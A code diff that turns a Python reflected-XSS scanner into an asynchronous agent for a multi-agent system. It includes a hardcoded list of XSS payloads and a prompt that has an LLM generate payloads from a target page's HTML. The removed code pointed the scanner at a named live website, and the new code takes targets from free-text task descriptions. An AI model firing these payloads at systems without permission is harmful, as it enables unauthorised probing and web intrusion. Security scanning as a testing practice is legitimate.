@@ -1,332 +1,477 @@
+import logging
+import re
+from datetime import datetime, timezone
+from typing import Any, Dict, List
+from urllib.parse import parse_qs, urlencode, urljoin, urlparse
+
+import aiohttp
+import requests
+from bs4 import BeautifulSoup
 from dotenv import load_dotenv
+from pydantic import BaseModel, Field, ValidationError
+
+from boss.utils import serialize_task_to_string
+from boss.wrappers.wrapper_agent import WrapperAgent
+
+################################################################################
+# 1. Load environment, configure logging
+################################################################################
 
 load_dotenv()
 
-import itertools
-import os
-import re
-from urllib.parse import parse_qs, urlencode, urljoin, urlparse
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(name)s:%(funcName)s:%(lineno)d: %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S",
+)
+logger = logging.getLogger(__name__)
+logger.propagate = False
 
-import requests
-from bs4 import BeautifulSoup
-from openai import OpenAI
-
-# Optional: Headless browser integration with playwright
-# pip install playwright
-# playwright install
-try:
-    from playwright.sync_api import sync_playwright
-
-    HEADLESS_AVAILABLE = True
-except ImportError:
-    HEADLESS_AVAILABLE = False
+################################################################################
+# 2. Define a helper function to fetch the URL text using aiohttp
+################################################################################
 
 
-client = OpenAI(api_key=os.environ.get("OPENAI_API_KEY"))
-
-# A known baseline list of common XSS payloads (subset of known payloads)
-KNOWN_PAYLOADS = [
-    "<script>alert(1)</script>",
-    '";alert(1);//',
-    "<img src=x onerror=alert(1)>",
-    "<svg><script>alert(1)</script>",
-    "'><script>alert(document.domain)</script>",
-    "</script><script>alert('XSS')</script>",
-    "<iframe src=javascript:alert(1)>",
-    "<body onload=alert(1)>",
-]
-
-
-def generate_llm_xss_payloads(
-    llm_model="gpt-4o-mini", html_content="", num_payloads=50
-):
+async def fetch(session: aiohttp.ClientSession, url: str) -> str:
     """
-    Generates additional XSS payloads using an LLM, incorporating HTML content.
-    """
-    prompt = f"""
-        Given the following HTML content of a webpage:
-        
-        ```html
-        {html_content}
-        ```
-        
-        Generate {num_payloads} unique XSS (Cross-Site Scripting) payloads that 
-        could potentially exploit reflected XSS vulnerabilities on this page.
-        Consider different input types, attributes, event handlers, and encodings.
-        Only provide the payloads, one per line, no extra commentary.
+    Fetch the URL using the provided aiohttp session and return response text.
+    Returns an empty string if there's an exception or non-200 status.
     """
     try:
-        response = client.chat.completions.create(
-            model=llm_model, messages=[{"role": "user", "content": prompt}]
-        )
-        lines = response.choices[0].message.content.strip().split("\n")
-        # Strip surrounding whitespace from each payload
-        lines = [l.strip() for l in lines if l.strip()]
-        return lines
+        async with session.get(url) as response:
+            return await response.text()
+
     except Exception as e:
-        print(f"Error with LLM generation: {e}")
-        return []
+        logger.error(f"Exception fetching {url}: {e}")
+        return ""
 
 
-def encode_payloads(payload):
+################################################################################
+# 2. Define a Pydantic model to parse the user's request
+################################################################################
+
+
+class XssScanCommand(BaseModel):
     """
-    Return multiple encoded versions of the payload to try different bypass techniques.
+    Model for an XSS scanning command.
+    This is what we'll parse from the user prompt via structured output.
     """
-    # Basic HTML entity encoding (only a few chars)
-    html_encoded = (
-        payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
+
+    target_url: str = Field(
+        description="Full target URL (https or http) to scan for potential XSS vulnerabilities."
+    )
+    num_payloads: int = Field(
+        description="Number of XSS payloads to generate/test using the LLM (if applicable).",
+    )
+    use_browser: bool = Field(
+        description="Whether to attempt a headless browser check (Playwright).",
     )
 
-    # URL-encoded payload
-    url_encoded = requests.utils.quote(payload)
 
-    return [payload, html_encoded, url_encoded]
+################################################################################
+# 3. Define the XSS-scanning agent
+################################################################################
 
 
-def extract_parameters_from_forms(html_content):
-    """
-    Extract potential parameter names from forms and other HTML elements on the page.
-    """
-    soup = BeautifulSoup(html_content, "html.parser")
-    params = set()
+class WrapperXssAgent(WrapperAgent):
+    def __init__(
+        self,
+        agent_id: str = "agent_xss_scanner",
+        kafka_bootstrap_servers: str = "localhost:9092",
+    ):
+        super().__init__(agent_id, kafka_bootstrap_servers)
+        self.setup_task_logger()
 
-    # Extract inputs from form elements
-    for form in soup.find_all("form"):
-        # Inputs: input, select, textarea, button
-        for tag in form.find_all(["input", "select", "textarea", "button"]):
-            name = tag.get("name")
-            if name:
-                params.add(name)
-            # Also consider 'id' as potential parameter name
-            id_attr = tag.get("id")
-            if id_attr:
-                params.add(id_attr)
-            # Data attributes that might be used as parameters
-            for attr in tag.attrs:
-                if attr.startswith("data-"):
-                    params.add(attr)
+    ############################################################################
+    # 3a. Parse the user's request from the BOSS system using structured output
+    ############################################################################
+    async def _call_openai_api(self, prompt: str) -> XssScanCommand:
+        """
+        Asynchronously call an LLM (e.g., OpenAI) with structured output to parse
+        the XSS scanning command.
+        """
+        try:
+            chat_completion = await self.openai_client.beta.chat.completions.parse(
+                model="gpt-4o-mini",
+                messages=[
+                    {
+                        "role": "system",
+                        "content": (
+                            "You're given a step description. "
+                            "We want a JSON that fits the XssScanCommand schema: "
+                            "the target_url should be extracted from the step description in the form of a FQDN URL, if there is no URL in the step description, return an empty object!"
+                            "the num_payloads should be at least 1 and at most 10!"
+                            "the use_browser you can determine based on the step description."
+                        ),
+                    },
+                    {"role": "user", "content": prompt},
+                ],
+                response_format=XssScanCommand,
+            )
 
-    # Extract query parameters from action attributes in forms
-    for form in soup.find_all("form"):
-        action = form.get("action")
-        if action:
-            parsed_url = urlparse(action)
+            content = chat_completion.choices[0].message.parsed
+            logger.info(f"Received from LLM: {content}")
+
+            return content
+
+        except Exception as e:
+            logger.error(f"Error parsing XSS scan command: {e}")
+            return None
+
+    async def _generate_llm_xss_payloads(
+        self, html_content: str, num_payloads: int
+    ) -> List[str]:
+        """
+        Generates additional XSS payloads using an LLM, incorporating HTML content.
+        """
+        prompt = f"""
+            Given the following HTML content of a webpage:
+    ```html
+    {html_content}
+    ```
+
+    Generate {num_payloads} unique XSS (Cross-Site Scripting) payloads that
+    could potentially exploit reflected XSS vulnerabilities on this page.
+    Consider different input types, attributes, event handlers, and encodings.
+    Only provide the payloads, one per line, no extra commentary.
+        """
+        try:
+            response = await self.openai_client.chat.completions.create(
+                model="gpt-4o-mini", messages=[{"role": "user", "content": prompt}]
+            )
+            lines = response.choices[0].message.content.strip().split("\n")
+            # Strip surrounding whitespace from each payload
+            lines = [l.strip() for l in lines if l.strip()]
+            return lines
+        except Exception as e:
+            logger.error(f"Error with LLM payload generation: {e}")
+            return []
+
+    def _check_security_headers(self, response) -> None:
+        headers = response.headers
+        csp = headers.get("Content-Security-Policy")
+        x_xss = headers.get("X-XSS-Protection")
+        strict_transport = headers.get("Strict-Transport-Security")
+
+        self.task_logger.info("[*] Security Headers:")
+        if csp:
+            self.task_logger.info(f"    - CSP detected: {csp}")
+        else:
+            self.task_logger.info("    - No CSP detected.")
+
+        if x_xss:
+            self.task_logger.info(f"    - X-XSS-Protection: {x_xss}")
+        else:
+            self.task_logger.info("    - No X-XSS-Protection header.")
+
+        if strict_transport:
+            self.task_logger.info(
+                f"    - Strict-Transport-Security: {strict_transport}"
+            )
+
+    ############################################################################
+    # 3b. The main XSS scanning logic
+    ############################################################################
+    async def execute_xss_scan(
+        self,
+        target_url: str,
+        num_payloads: int,
+        use_browser: bool,
+    ) -> Dict[str, Any]:
+        self.task_logger.info(f"Starting XSS scan for URL={target_url}")
+        start_time = datetime.now(timezone.utc)
+
+        # Use a single session for this entire scan
+        async with aiohttp.ClientSession() as session:
+            try:
+                # Non-blocking GET
+                html_content = await fetch(session, target_url)
+                if not html_content:
+                    self.task_logger.error(f"Failed to retrieve page {target_url}.")
+                    return {"error": f"Failed to retrieve page: {target_url}"}
+
+                self.task_logger.info(
+                    f"Response body: {html_content[:200]} ..."
+                )  # just preview
+            except Exception as e:
+                self.task_logger.error(f"Failed to retrieve page {target_url}: {e}")
+                return {"error": f"Failed to retrieve page: {e}"}
+
+            # Known baseline XSS payloads
+            known_payloads = [
+                "<script>alert(1)</script>",
+                '";alert(1);//',
+                "<img src=x onerror=alert(1)>",
+                "<svg><script>alert(1)</script>",
+                "'><script>alert(document.domain)</script>",
+                "</script><script>alert('XSS')</script>",
+                "<iframe src=javascript:alert(1)>",
+                "<body onload=alert(1)>",
+            ]
+
+            # Generate additional LLM-based payloads
+            additional_payloads = await self._generate_llm_xss_payloads(
+                html_content=html_content, num_payloads=num_payloads
+            )
+
+            all_payloads = list(set(known_payloads + additional_payloads))
+
+            discovered_params = self._extract_parameters_from_forms(html_content)
+
+            # Replacing synchronous calls to `_test_xss` with an async approach
+            vulnerabilities = await self._test_xss(
+                session, target_url, discovered_params, all_payloads, use_browser
+            )
+
+        execution_time = (datetime.now(timezone.utc) - start_time).total_seconds()
+        self.task_logger.info(
+            f"XSS scanning completed in {execution_time:.2f} seconds."
+        )
+
+        return {
+            "target": target_url,
+            "discovered_params": discovered_params,
+            "vulnerabilities_found": vulnerabilities,
+            "scan_duration_seconds": execution_time,
+        }
+
+    def _extract_parameters_from_forms(self, html_content: str) -> List[str]:
+        soup = BeautifulSoup(html_content, "html.parser")
+        params = set()
+
+        # Extract inputs from form elements
+        for form in soup.find_all("form"):
+            for tag in form.find_all(["input", "select", "textarea", "button"]):
+                name = tag.get("name")
+                if name:
+                    params.add(name)
+                # also check 'id'
+                id_attr = tag.get("id")
+                if id_attr:
+                    params.add(id_attr)
+                # data-* attributes
+                for attr in tag.attrs:
+                    if attr.startswith("data-"):
+                        params.add(attr)
+
+            # extract query params from 'action'
+            action = form.get("action")
+            if action:
+                parsed_url = urlparse(action)
+                query_params = parse_qs(parsed_url.query)
+                for param in query_params:
+                    params.add(param)
+
+        # Extract parameters from <script> tags
+        for script in soup.find_all("script"):
+            if script.string:
+                # naive approach to find ?key=value pairs
+                matches = re.findall(r'\?([^#\'"]+)', script.string)
+                for match in matches:
+                    pairs = match.split("&")
+                    for pair in pairs:
+                        if "=" in pair:
+                            key, _ = pair.split("=", 1)
+                            params.add(key)
+
+        # Extract parameters from links
+        for link in soup.find_all("a", href=True):
+            href = link["href"]
+            parsed_url = urlparse(href)
             query_params = parse_qs(parsed_url.query)
             for param in query_params:
                 params.add(param)
 
-    # Extract parameters from URL in script tags
-    for script in soup.find_all("script"):
-        if script.string:
-            # Simple regex to find query parameters in URLs within JavaScript
-            matches = re.findall(r'\?([^#\'"]+)', script.string)
-            for match in matches:
-                pairs = match.split("&")
-                for pair in pairs:
-                    if "=" in pair:
-                        key, _ = pair.split("=", 1)
-                        params.add(key)
+        # Some common param names as heuristics
+        common_params = [
+            "id",
+            "user",
+            "uid",
+            "token",
+            "auth",
+            "action",
+            "type",
+            "name",
+            "page",
+            "lang",
+            "redirect",
+            "callback",
+        ]
+        params.update(common_params)
 
-    # Extract parameters from links (e.g., href attributes)
-    for link in soup.find_all("a", href=True):
-        href = link["href"]
-        parsed_url = urlparse(href)
-        query_params = parse_qs(parsed_url.query)
-        for param in query_params:
-            params.add(param)
+        # Fallback
+        if not params:
+            params = {"test"}
 
-    # Include common parameter names as heuristic
-    common_params = [
-        "id",
-        "user",
-        "uid",
-        "token",
-        "auth",
-        "action",
-        "type",
-        "name",
-        "page",
-        "lang",
-        "redirect",
-        "callback",
-    ]
-    params.update(common_params)
+        return list(params)
 
-    # Fallback to a default param if nothing found
-    if not params:
-        params = {"test"}
+    def _encode_payloads(self, payload: str) -> List[str]:
+        html_encoded = (
+            payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
+        )
+        url_encoded = requests.utils.quote(payload)
+        return [payload, html_encoded, url_encoded]
 
-    return list(params)
-
-
-def check_security_headers(response):
-    """
-    Print and analyze security-related headers.
-    """
-    headers = response.headers
-    csp = headers.get("Content-Security-Policy", None)
-    x_xss = headers.get("X-XSS-Protection", None)
-    strict_transport = headers.get("Strict-Transport-Security", None)
-
-    print("[*] Security Headers:")
-    if csp:
-        print(f"    - CSP detected: {csp}")
-    else:
-        print("    - No CSP detected.")
-
-    if x_xss:
-        print(f"    - X-XSS-Protection: {x_xss}")
-    else:
-        print("    - No X-XSS-Protection header.")
-
-    if strict_transport:
-        print(f"    - Strict-Transport-Security: {strict_transport}")
-
-
-def is_payload_reflected(html, payload):
-    """
-    Check if payload or its encoded forms appear in the response.
-    More sophisticated checks might analyze DOM structure. Here we do simple substring checks.
-    """
-    # Check raw payload
-    if payload in html:
-        return True
-
-    # Check some common encodings (if not found in raw form)
-    # HTML encoded checks
-    html_encoded = (
-        payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
-    )
-    if html_encoded in html:
-        return True
-
-    return False
-
-
-def try_payload_in_browser(url):
-    """
-    OPTIONAL: Use a headless browser to detect if an alert is triggered or
-    console logs appear. This is a simplistic check: we look for evidence that
-    our payload executed. For real tests, you'd need a custom JS instrumentation.
-    """
-    if not HEADLESS_AVAILABLE:
-        return False
-    with sync_playwright() as p:
-        browser = p.chromium.launch(headless=True)
-        page = browser.new_page()
-
-        # Listen to console events
-        console_logs = []
-        page.on("console", lambda msg: console_logs.append(msg.text))
-
-        try:
-            page.goto(url, timeout=10000)
-            # Check for known marker (like alert calls)
-            # This isn't perfect: we can't catch native alerts easily without a dialog handler.
-            # Instead, we rely on payloads that cause console.log or some other detectable side-effect.
-            # Another option is to replace alert function on runtime and check if it's called:
-            # page.evaluate("window.alert = (msg) => console.log('ALERT:'+msg);")
-            # But since we can't ensure script execution order, this might not always work.
-
-            # We give a second for scripts to run.
-            page.wait_for_timeout(2000)
-        except:
-            pass
-        finally:
-            browser.close()
-
-        # Check console logs for something that indicates execution (like "ALERT:")
-        if any("ALERT:" in log for log in console_logs):
+    def _is_payload_reflected(self, html: str, payload: str) -> bool:
+        # Plain check
+        if payload in html:
             return True
-    return False
+        # Check HTML-encoded version
+        html_encoded = (
+            payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
+        )
+        if html_encoded in html:
+            return True
+        return False
 
+    async def _test_xss(
+        self,
+        session: aiohttp.ClientSession,
+        target_url: str,
+        parameters: List[str],
+        payloads: List[str],
+        use_browser: bool = False,
+    ) -> Dict[str, List[Any]]:
+        """
+        Test each discovered parameter with each payload. We re-use the same
+        aiohttp session to avoid overhead of multiple new connections.
+        """
+        vulnerable_params = {}
+        parsed_url = urlparse(target_url)
+        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+        path = parsed_url.path or "/"
 
-def test_xss(target_url, parameters, payloads, use_browser=False):
-    """
-    Try each payload in each parameter and check for reflected XSS.
-    If 'use_browser' is True, also try a headless browser check.
-    """
-    vulnerable_params = {}
-    parsed_url = urlparse(target_url)
-    base_url = parsed_url.scheme + "://" + parsed_url.netloc
-    path = parsed_url.path or "/"
-
-    for param_combo_length in range(1, len(parameters) + 1):
-        # Test single and multi-parameter combinations
-        for param_subset in itertools.combinations(parameters, param_combo_length):
+        for param_name in parameters:
             for payload in payloads:
-                # Try multiple encodings
-                for epayload in encode_payloads(payload):
+                # We encode in multiple ways for better coverage
+                for epayload in self._encode_payloads(payload):
+                    # Create a query dict
                     test_params = {
-                        p: (epayload if p in param_subset else "normal")
+                        p: (epayload if p == param_name else "normal")
                         for p in parameters
                     }
-
-                    # Construct URL
                     full_url = urljoin(base_url, path) + "?" + urlencode(test_params)
+
                     try:
-                        response = requests.get(full_url, timeout=10)
-                        html = response.text
-                        if response.status_code == 200:
-                            # Check if reflected
-                            if is_payload_reflected(html, epayload):
-                                # Optional browser check to confirm execution
-                                executed = False
-                                if use_browser:
-                                    executed = try_payload_in_browser(full_url)
+                        async with session.get(full_url) as resp:
+                            if resp.status == 200:
+                                html = await resp.text()
+                                if self._is_payload_reflected(html, epayload):
+                                    executed = False
+                                    # Use browser if needed, asynchronously
+                                    if use_browser:
+                                        # This is where you'd integrate playwright or similar
+                                        pass
 
-                                if param_subset not in vulnerable_params:
-                                    vulnerable_params[param_subset] = []
-                                vulnerable_params[param_subset].append(
-                                    (payload, epayload, executed)
-                                )
-
-                                print(
-                                    f"[+] Potential XSS in {param_subset} with payload {payload} (encoded: {epayload}). Executed: {executed}"
-                                )
+                                    if param_name not in vulnerable_params:
+                                        vulnerable_params[param_name] = []
+                                    vulnerable_params[param_name].append(
+                                        (payload, epayload, executed)
+                                    )
+                                    self.task_logger.info(
+                                        f"[+] Potential XSS in {param_name} with payload {payload} "
+                                        f"(encoded: {epayload}). Executed: {executed}"
+                                    )
+                                else:
+                                    self.task_logger.info(
+                                        f"[-] No reflection for {param_name} with payload {payload}"
+                                    )
                             else:
-                                print(
-                                    f"[-] No reflection for payload in {param_subset} with {payload}"
+                                self.task_logger.info(
+                                    f"[-] {full_url} returned {resp.status}, skipping."
                                 )
-                        else:
-                            print(
-                                f"[-] {full_url} returned {response.status_code}, skipping."
-                            )
-                    except requests.RequestException as e:
-                        print(f"[-] Request error for {full_url}: {e}")
+                    except Exception as e:
+                        self.task_logger.error(f"[-] Request error for {full_url}: {e}")
 
-    return vulnerable_params
+        return vulnerable_params
 
+    ############################################################################
+    # 3d. Validate user input
+    ############################################################################
+    def is_valid_target(self, target_url: str) -> bool:
+        return target_url.lower().startswith(
+            "http://"
+        ) or target_url.lower().startswith("https://")
 
-if __name__ == "__main__":
-    target_url = "https://www.playwsop.com"
-    try:
-        response = requests.get(target_url, timeout=10)
-        response.raise_for_status()
-        html_content = response.text
-    except requests.RequestException as e:
-        print(f"Failed to get page {target_url}: {e}")
-        exit()
+    ############################################################################
+    # 3e. Orchestrate everything in process_task (as in the Dig example)
+    ############################################################################
+    async def process_task(self, task: Dict[str, Any]) -> Dict[str, Any]:
+        self.task_logger.info("**************** XSS SCANNER AGENT ****************")
 
-    check_security_headers(response)
-    discovered_params = extract_parameters_from_forms(html_content)
+        if not isinstance(task, dict) or "task_id" not in task or "step_id" not in task:
+            logger.error("Invalid task format")
+            return self._create_task_result(
+                task.get("task_id"), task.get("step_id"), error="Invalid task format"
+            )
 
-    # Combine known payloads with LLM generated payloads
-    llm_payloads = generate_llm_xss_payloads(html_content=html_content, num_payloads=50)
-    all_payloads = list(set(KNOWN_PAYLOADS + llm_payloads))
+        try:
+            task_id = task["task_id"]
+            step_id = task["step_id"]
+            self.task_logger.info(
+                f"Processing task with ID: {task_id} and step ID: {step_id}"
+            )
 
-    # Test for XSS (no browser by default, turn on if you have playwright installed)
-    vulnerabilities = test_xss(
-        target_url, discovered_params, all_payloads, use_browser=False
-    )
+            # Extract step description
+            step_description = task.get("description", "")
+            task_prompt = f"Current step:\n{step_description}"
 
-    if vulnerabilities:
-        print("\n[!] Potential XSS Vulnerabilities Found:")
-        for param_combo, payload_info_list in vulnerabilities.items():
-            print(f"  - Parameter combination: {param_combo}")
-            for original_payload, encoded_payload, executed in payload_info_list:
-                print(
-                    f"    - Payload: {original_payload} (Encoded tried: {encoded_payload}, Executed: {executed})"
+            targets = task.get("targets", [])
+
+            if targets:
+                task_prompt += f"\nTargets:\n{targets}"
+
+            # 1. Parse user command from the LLM / structured output
+            parsed_command = await self._call_openai_api(task_prompt)
+            if parsed_command is None:
+                return self._create_task_result(
+                    task_id=task_id,
+                    step_id=step_id,
+                    error="Error parsing XSS scan command",
                 )
-    else:
-        print("\n[-] No XSS vulnerabilities detected with generated payloads.")
+
+            self.task_logger.info(f"Parsed command parameters: {parsed_command}")
+
+            # 2. Validate the target
+            if not self.is_valid_target(parsed_command.target_url):
+                return self._create_task_result(
+                    task_id=task_id,
+                    step_id=step_id,
+                    error=f"Invalid target URL: {parsed_command.target_url}",
+                )
+
+            # 3. Execute the XSS scan
+            scan_result = await self.execute_xss_scan(
+                target_url=parsed_command.target_url,
+                num_payloads=parsed_command.num_payloads,
+                use_browser=parsed_command.use_browser,
+            )
+
+            # 4. Prepare and return the result to BOSS
+            result = self._create_task_result(
+                task_id=task_id,
+                step_id=step_id,
+                step_description=step_description,
+                result=serialize_task_to_string(scan_result),
+                metadata={
+                    "target_url": parsed_command.target_url,
+                    "num_payloads": parsed_command.num_payloads,
+                    "use_browser": parsed_command.use_browser,
+                },
+            )
+            return result
+
+        except ValidationError as ve:
+            self.task_logger.error(f"Validation error: {ve}")
+            return self._create_task_result(
+                task_id=task.get("task_id"),
+                step_id=task.get("step_id"),
+                error=f"Validation error: {ve}",
+            )
+        except Exception as e:
+            self.task_logger.error(f"Error processing task: {e}")
+            return self._create_task_result(
+                task_id=task.get("task_id"),
+                step_id=task.get("step_id"),
+                error=str(e),
+            )
